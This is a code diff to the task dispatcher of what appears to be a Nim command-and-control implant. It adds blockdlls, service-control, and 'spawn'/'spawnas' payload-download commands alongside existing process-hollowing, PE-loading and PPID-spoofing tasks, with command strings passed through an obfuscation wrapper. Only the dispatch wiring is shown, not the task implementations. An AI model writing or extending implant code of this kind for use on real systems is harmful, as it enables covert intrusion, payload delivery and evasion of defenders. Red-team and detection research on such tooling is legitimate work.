@@ -63,6 +63,7 @@ when defined(windows):
   import ../tasks/spawnto_x64
   import ../tasks/spawnto_x86
   import ../tasks/ppid
+  import ../tasks/blockdlls
   import ../tasks/reg_query
   import ../tasks/reg_write_value
   import ../tasks/net_dclist
@@ -76,6 +77,9 @@ when defined(windows):
   import ../tasks/donut
   import ../tasks/inject_hollow
   import ../tasks/run_pe
+  import ../tasks/sc
+  import ../tasks/spawn
+  import ../tasks/spawnas
 
 type
   TaskExecutionResult* = object
@@ -534,6 +538,18 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
           obf("user_output"): obf("ppid command is only available on Windows")
         }
     
+    of obf("blockdlls"):
+      when defined(windows):
+        debug "[DEBUG] Executing blockdlls command"
+        result.response = blockdlls(taskId, params)
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("blockdlls command is only available on Windows")
+        }
+    
     of obf("reg_query"):
       when defined(windows):
         debug "[DEBUG] Executing reg_query command"
@@ -667,6 +683,45 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
           obf("completed"): true,
           obf("status"): "error",
           obf("user_output"): obf("run_pe command is only available on Windows")
+        }
+    
+    of obf("sc"):
+      when defined(windows):
+        debug "[DEBUG] Executing sc command"
+        result.response = sc(taskId, params)
+        result.response[obf("task_id")] = %taskId
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("sc command is only available on Windows")
+        }
+    
+    of obf("spawn"):
+      when defined(windows):
+        debug "[DEBUG] Starting spawn (payload download)"
+        result.response = spawn(taskId, params)
+        result.needsBackgroundTracking = true
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("spawn command is only available on Windows")
+        }
+    
+    of obf("spawnas"):
+      when defined(windows):
+        debug "[DEBUG] Starting spawnas (payload download)"
+        result.response = spawnas(taskId, params)
+        result.needsBackgroundTracking = true
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("spawnas command is only available on Windows")
         }
     
     else:
